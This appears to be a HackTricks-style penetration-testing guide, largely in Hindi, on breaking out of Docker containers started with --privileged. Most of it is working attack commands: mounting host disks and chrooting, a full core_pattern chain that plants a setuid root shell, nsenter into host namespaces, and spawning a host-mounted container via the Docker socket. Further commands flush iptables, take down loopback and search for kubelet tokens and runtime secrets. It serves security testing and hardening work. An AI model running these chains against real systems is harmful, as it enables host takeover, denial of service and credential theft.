# `--privileged` कंटेनरों से बाहर निकलना

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

`--privileged` के साथ शुरू किया गया कंटेनर सिर्फ एक या दो अतिरिक्त अनुमतियों वाले सामान्य कंटेनर जैसा नहीं होता। वास्तव में, `--privileged` उन कई डिफ़ॉल्ट रनटाइम सुरक्षा उपायों को हटाता या कमजोर करता है जो सामान्यतः वर्कलोड को खतरनाक host संसाधनों से दूर रखते हैं। ठीक प्रभाव अभी भी runtime और host पर निर्भर करता है, लेकिन Docker के लिए सामान्य परिणाम है:

- सभी capabilities प्रदान की जाती हैं
- device cgroup प्रतिबंध हटा दिए जाते हैं
- कई kernel filesystems अब read-only माउंट होना बंद हो जाते हैं
- default masked procfs paths गायब हो जाते हैं
- seccomp filtering अक्षम हो जाता है
- AppArmor confinement अक्षम हो जाता है
- SELinux isolation अक्षम हो जाता है या इसके स्थान पर बहुत व्यापक लेबल आ जाता है

महत्वपूर्ण नतीजा यह है कि एक privileged कंटेनर सामान्यतः किसी सूक्ष्म kernel exploit की आवश्यकता नहीं होती। कई मामलों में यह सीधे host devices, host-facing kernel filesystems, या runtime interfaces के साथ इंटरैक्ट करके और फिर host shell में pivot करके काम कर सकता है।

## `--privileged` जो स्वतः नहीं बदलता

`--privileged` स्वतः host PID, network, IPC, या UTS namespaces में नहीं जुड़ता। एक privileged कंटेनर के पास अभी भी private namespaces हो सकते हैं। इसका मतलब है कि कुछ escape chains के लिए एक अतिरिक्त शर्त चाहिए होती है, जैसे:

- एक host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

ये शर्तें वास्तविक misconfigurations में अक्सर आसानी से पूरी हो जाती हैं, लेकिन वे अवधारणात्मक रूप से `--privileged` से अलग होती हैं।

## एस्केप रास्ते

### 1. एक्स्पोज़्ड डिवाइसेज़ के माध्यम से host डिस्क को माउंट करना

एक privileged कंटेनर सामान्यतः `/dev` के नीचे बहुत अधिक device nodes देखता है। यदि host block device दिखाई देता है, तो सबसे सरल एस्केप इसे माउंट करके और `chroot` करके host filesystem में जाना है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
यदि root partition स्पष्ट नहीं है, तो पहले block layout को enumerate करें:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
यदि व्यावहारिक रास्ता writable host mount में एक setuid helper रखने का है बजाय `chroot` करने के, तो याद रखें कि हर filesystem setuid bit को सम्मानित नहीं करता है। एक त्वरित host-side capability check है:
```bash
mount | grep -v "nosuid"
```
यह उपयोगी है क्योंकि `nosuid` फाइलसिस्टम के अंतर्गत लिखने योग्य paths पारंपरिक "drop a setuid shell and execute it later" वर्कफ़्लोज़ के लिए कम रोचक होते हैं।

यहाँ जिन कमजोर सुरक्षा उपायों का दुरुपयोग किया जा रहा है वे हैं:

- डिवाइस का पूर्ण एक्सपोज़र
- व्यापक capabilities, विशेष रूप से `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. होस्ट bind mount को माउंट या पुनः उपयोग करें और `chroot`

यदि host root filesystem पहले से ही container के अंदर माउंट है, या यदि container आवश्यक mounts बना सकता है क्योंकि यह privileged है, तो host shell अक्सर सिर्फ एक `chroot` दूर होता है:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि कोई host root bind mount मौजूद नहीं है लेकिन host storage पहुंच योग्य है, तो एक बनाएं:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
यह तरीका दुरुपयोग करता है:

- कमज़ोर mount प्रतिबंध
- पूर्ण capabilities
- MAC confinement की कमी

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. लिखने योग्य `/proc/sys` या `/sys` का दुरुपयोग

`--privileged` के बड़े परिणामों में से एक यह है कि procfs और sysfs सुरक्षा काफी कमज़ोर हो जाती हैं। यह सामान्यतः masked या read-only माउंट किए हुए host-facing kernel इंटरफेस को उजागर कर सकता है।

एक क्लासिक उदाहरण है `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
अन्य उच्च-मूल्य वाले पथों में शामिल हैं:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
This path abuses:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount- या Namespace-आधारित एस्केप के लिए पूर्ण capabilities का उपयोग करें

एक privileged container उन capabilities को प्राप्त करता है जो सामान्य containers से सामान्यतः हटाई जाती हैं, जिनमें `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, और कई अन्य शामिल हैं। यह अक्सर काफी होता है कि किसी स्थानीय foothold को host escape में बदल दिया जाए, जैसे ही कोई अन्य exposed surface मौजूद हो।

एक सरल उदाहरण है अतिरिक्त फाइल सिस्टम mount करना और namespace entry का उपयोग करना:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
यदि host PID भी साझा किया गया है, तो यह कदम और भी छोटा हो जाता है:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
यह पथ दुरुपयोग करता है:

- the default privileged capability set
- optional host PID sharing

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. रनटाइम सॉकेट्स के माध्यम से बच निकलना

A privileged container अक्सर host runtime state या sockets दिखाई देने के साथ समाप्त हो जाता है। यदि कोई Docker, containerd, या CRI-O socket पहुँच योग्य है, तो सबसे सरल तरीका अक्सर runtime API का उपयोग करके host access के साथ दूसरा container लॉन्च करना होता है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd के लिए:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
यह मार्ग दुरुपयोग करता है:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. नेटवर्क अलगाव के दुष्प्रभाव हटाएँ

`--privileged` अपने आप host network namespace में नहीं जुड़ता, लेकिन अगर container में `--network=host` या अन्य host-network access भी हो, तो पूरा network stack परिवर्तनीय बन जाता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह हमेशा एक सीधे host shell में प्रवेश नहीं होता, लेकिन यह denial of service, traffic interception, या loopback-only management services तक पहुँच दे सकता है।

संबंधित पृष्ठ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. होस्ट सीक्रेट्स और रनटाइम स्टेट पढ़ें

भले ही clean shell escape तुरंत न हो, privileged containers के पास अक्सर host secrets, kubelet state, runtime metadata, और आस-पास के container filesystems पढ़ने के लिए पर्याप्त पहुँच होती है:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
यदि `/var` host-mounted है या runtime directories दिखाई देती हैं, तो host shell प्राप्त किए बिना भी यह lateral movement या cloud/Kubernetes credential theft के लिए पर्याप्त हो सकता है।

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

निम्नलिखित commands का उद्देश्य यह पुष्टि करना है कि कौन से privileged-container escape families तत्काल व्यवहार्य हैं।
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
यहां क्या रोचक है:

- पूर्ण capability सेट, विशेष रूप से `CAP_SYS_ADMIN`
- लिखने योग्य proc/sys का एक्सपोज़र
- दिखने योग्य host devices
- seccomp और MAC confinement का अभाव
- runtime sockets या host root bind mounts

इनमें से कोई भी एक post-exploitation के लिए पर्याप्त हो सकता है। कई साथ होने पर आम तौर पर इसका मतलब होता है कि container व्यवहारिक रूप से host compromise से एक या दो कमांड दूर है।

## संबंधित पृष्ठ

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
